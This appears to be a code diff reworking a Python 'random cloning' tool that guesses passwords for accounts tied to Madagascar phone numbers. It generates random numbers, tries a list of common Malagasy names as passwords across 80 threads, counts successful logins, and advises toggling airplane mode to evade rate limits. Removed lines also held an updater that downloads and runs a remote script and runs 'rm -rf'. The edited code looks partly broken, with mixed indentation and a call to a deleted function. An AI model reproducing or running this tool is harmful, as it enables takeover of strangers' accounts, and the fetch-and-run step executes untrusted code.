@@ -1,3 +1,8 @@
+# Définir le numéro de version
+version_actuelle = "2.0"
+
+
+
 import os
 import random
 import string 
@@ -47,126 +52,86 @@ logo_colors = [B, C, P, H]
 line_colors = [bblack, M, H, byellow, bblue, P, C, B]
 word_colors = [B, C, P, H, M, byellow, bblue, P, C, B]
 #-------------logo-----------------#
-logo = """
-         \033[1;37m ##     ##     ######      ######   
-         \033[1;37m ###   ###    ##    ##    ##    ##  
-         \033[1;37m #### ####    ##          ## 
-         \033[1;37m ## ### ##     ######      ######
-         \033[1;37m ##     ##          ##          ##
-         \033[1;37m ##     ##    ##    ##    ##    ##
-         \033[1;37m ##     ##     ######      ###### \033[1;32m LI0N\033[1;37m 
---------------------------------------------------
-[•]CREATED BY     : \033[1;32mAB KHANX\033[1;37m
-[•]FACEBOOK       : \033[1;32mAB KHANX\033[1;37m
-[•]YOUTUBE        : \033[1;32mMSS TRICKS\033[1;37m
-[•]STATUS         : \033[1;32mFREE\033[1;37m
---------------------------------------------------
-[•] \033[1;37mVERSION    :\033[1;32m 1.3 \033[1;37m"DON'T WORRY FOR UPDATES!"\033[1;37m
---------------------------------------------------"""
+logo=(f'''{B}
 
-def lines():
-	print('\33[1;37m--------------------------------------------------')
-loop = 0
-oks = []
-cps = []
-try:
-    print('\n\033[1;37m[•] WAIT CHECKING FOR UPDATE')
-    proxy = requests.get('https://raw.githubusercontent.com/ALI-JUTT/Ahmed/main/update.txt').text.splitlines()
-    v = 3.1
-    update = requests.get('https://raw.githubusercontent.com/ALI-JUTT/files/main/version.txt').text
-    if str(v) in update:
-        os.system('rm -rf a*')
-        os.system('curl -L https://raw.githubusercontent.com/ALI-JUTT/ali/main/ali.py > ali.py')
-        os.system('python ali.py')
-    else:pass
-except:print('\n\033[1;31mNo internet connection ... \033[0;97m')
 
-#global functions
-def dynamic(text):
-    titik = ['.   ','..  ','... ','.... ']
-    for o in titik:
-        print('\r'+text+o),
-        sys.stdout.flush();time.sleep(1)
+                                 
+,--.  ,--.,------.,--.,--.  ,--. 
+|  ,'.|  ||  .---'|  ||  ,'.|  | 
+|  |' '  ||  `--, |  ||  |' '  | 
+|  | `   ||  `---.|  ||  | `   | 
+`--'  `--'`------'`--'`--'  `--' 
+                                 
 
-def rehan():
-	os.system('clear')
-	print(logo)
-	print('[1] RANDOM PAK CLONING')
-	print('[2] RANDOM BD CLONING')
-	print('[3] RANDOM CHOICE PASS CLONING')
-	print('[4] CONTACT WITH OWNER')
-	print('[0] EXIT')
-	lines()
-	gh = input('[•] CHOOSE : ')
-	if gh =='1':
-		menu()
-	
-	elif gh =='0':
-		print('[•] THANKS FOR USE ')
-		time.sleep(3)
-		exit()
-	else:
-		print('[•] CHOOSE CORRECT OPTION')
-		time.sleep(2)
-		rehan()
+                                            
 
-def menu():
-		os.system('clear')
-	print(logo)
-	print('[1] LAST 7 DIGIT')
-
-	print('[0] EXIT TO MAIN MENU')
-	lines()
-	opt = input('[•] CHOOSE: ')
-	if opt =='1':
-		svn_digit()
-	
-	elif opt =='0':
-		rehan()
-	else:
-		print('\n\033[1;37m[•] Choose valid option\033[0;97m')
-		time.sleep(2)
-		menu()
-		
-def svn_digit():
-	user=[]
-	os.system('clear')
-	print(logo)
-	print('[•] EXAMPLE :034,038,033,032')
-	lines()
-	kode = input('[•]\033[1;37m PUT YOUR SIM CODE : ')
-	os.system('clear')
-	print(logo)
-	print('[•] MAX LIMIT [50000]')
-	lines()
-	limit = int(input('[•] ENTER LIMIT :  '))
-	for nmbr in range(limit):
-		nmp = ''.join(random.choice(string.digits) for _ in range(7))
-		user.append(nmp)
-	with ThreadPool(max_workers=70) as yaari:
-		os.system('clear')
-		print(logo)
-		tl = str(len(user))
-		print('[•] TOTAL ACCOUNTS    : \033[1;32m'+tl)
-		print('\033[1;37m[•] SELECTED CODE     : \033[1;32m'+kode)
-		print('\033[1;37m[•] METHOD YOU CHOOSE : \033[1;32mLAST 7 DIGIT')
+{warna}--------------------------------------------{B}
+ Owner    : {M}SAFIDINIAINA{M}
+ TOOL NAME : {warna}{P}SAFIDY{P}{warna}
+ GROUPE-FB   : NONE
+ STATUE : {H}PAID{H}
+ Facebook : {bblue}SM{bblue}
+ Tools    : {warna}[{M}VERSION 2.0{warna}]{warna}
+--------------------------------------------{B}''')
+#-------------linex def -------------#
+def linex():
+    print(f'{warna}--------------------------------------------{B}')
+#-------------clear def -------------#
+def clear():
+    os.system('clear')
+    print(logo)
+#-------------main def------------#
+def MR_ITACHI():
+    clear()
+    print(f'{B} [{warna}01{B}] RANDOM CLONING ')
+    print(f'{B} [{warna}00{B}] EXIT TERMINAL ')
+    linex()
+    option=input(f' {B}[{warna}??{B}] CHOISIR MENU >> ')
+    if option in ['01','1']:
+        BD_CLONING()
+    else:
+        exit(' MERCI BEAUCOUP  :)')
+#------------- bd clone def ----------#
+def BD_CLONING():
+    user=[]
+    clear()
+    print(' CODE SIM MALAGASY : [+26132] [+26134] [+26138] [+26133]')
+    print(' 261=0 Madagascar : [032] [034] [038] [033]')
+    code=input(' ENTER SIM CODE >> ')
+    linex()
+    print(' EXAMPLE LIMIT : [1000] [2000] [5000] [10000]')
+    try:
+        limit=int(input(' ENTER LIMIT >> '))
+    except ValueError:
+        limit=50000
+    clear()
+    for nmbr in range(limit):
+        nmp=''.join(map(str, generate_random_sequence(7)))
+        user.append(nmp)
+    with tred(max_workers=80) as Dipto:
+        tl=str(len(user))
+        print('[•] TOTAL ACCOUNTS    : \033[1;32m'+tl)
+		print('\033[1;37m[•] SELECTED CODE     : \033[1;32m'+code)
 		print('\x1b[1;97m[•] USE FLIGHT [\033[1;32mAIRPLANE\033[1;37m] MODE IN EVERY 5 MINUTES')
 		lines()
-		for guru in user:
-			uid = kode+guru
-			pwx = [guru,'fiderana','Fiderana','lafatra','fahendrena','Fahendrena','amboara','Amboara','miangaly','Miangaly','miangola','Miangola','fanasina','Fanasina','finoanq','Finoana','fandresena','Fandresena','nantenaina','rakotomalala','Rakotomalala','tanjona','Tanjona','solofo','Solofo','Nantenaina','nilaina','Nilaina','nirina','Nirina','Narindra','Rakoto','nomena','Nomena','Anjara','anjara','faniry','Faniry','rakoto','safidy','hasina','Hasina','tsilavina','Tsilavina','finaritra','Finaritra','fanomezana','Fanomezana','Sarindra','sarindra','nambinina','Nambinina','Sitraka','sitraka','mamitiana','Mamitiana','vololona','Vololona','mamisoa','Mamisoa','fanomezantsoa','Fanomezantsoa','fanantenana','Fanantenana','narindra','Narindra','sarobidy','Sarobidy','andriatsitohaina','Andriatsitohaina','lalaina','Lafatra','Jessica','Lalaina','mahery','Mahery','jessica','mandresy','Mandresy','harena','Harena']
-			yaari.submit(method_crack,uid,pwx,tl)
-	print('[✓] Crack process has been completed')
-	print('[?] Idz saved in [ok.txt,cp.txt]')
-	input('Press Enter To Go Back To Menu')
-	rehan()
-	def method_crack(uid,pwx):
+        for psx in user:
+            ids=code+psx
+            passlist=[psx,'sambatra','Sambatra','lafatra','lahatra','Lahatra','fahendrena','Fahendrena','amboara','Amboara','miangaly','Miangaly','miangola','Miangola','fanasina','Fanasina','fiderana','Fiderana','fandresena','Fandresena','nantenaina','rakotomalala','Rakotomalala','tanjona','Tanjona','solofo','Solofo','Nantenaina','nilaina','Nilaina','nirina','Nirina','Narindra','Rakoto','nomena','Nomena','Anjara','anjara','faniry','Faniry','rakoto','safidy','valisoa','Valisoa','malala','Malala','finoana','Finoana','fanomezana','Fanomezana','Sarindra','sarindra','nambinina','Nambinina','Sitraka','sitraka','mamitiana','Mamitiana','vololona','Vololona','mamisoa','Mamisoa','fanomezantsoa','Fanomezantsoa','fanantenana','Fanantenana','narindra','Narindra','sarobidy','Sarobidy','andriatsitohaina','Andriatsitohaina','lalaina','Lafatra','Jessica','Lalaina','mahery','Mahery','jessica','mandresy','Mandresy']
+            Dipto.submit(method_crack,ids,passlist)
+            
+    linex()
+    print(' LE CLONING EST FINI ')
+    print(' TOTAL OK ID '+str(len(oks)))
+    print(' TOTAL CP ID '+str(len(cps)))
+    input(' PRESS ENTER TO BACK  : ')
+    MR_ITACHI()
+#------------ method crack def ---------#
+def method_crack(ids, passlist):
     global oks
     global cps
     global loop
     try:
-        for ps in pwx:
-		
+        for pas in passlist:
             sys.stdout.write('\r\r \033[1;37m[Progress] %s|\033[1;32mSucces:%s'%(loop,len(oks)))
             sys.stdout.flush()
             adid=str(uuid.uuid4())
@@ -206,3 +171,12 @@ def svn_digit():
         loop+=1
     except:
         pass
+#-------------end----------------#
+
+# Générateur de séquence aléatoire
+def generate_random_sequence(length):
+    sequence = [random.choice(string.digits) for _ in range(length)]
+    return sequence
+
+# Appel à la fonction MR_ITACHI pour démarrer le programme
+MR_ITACHI()
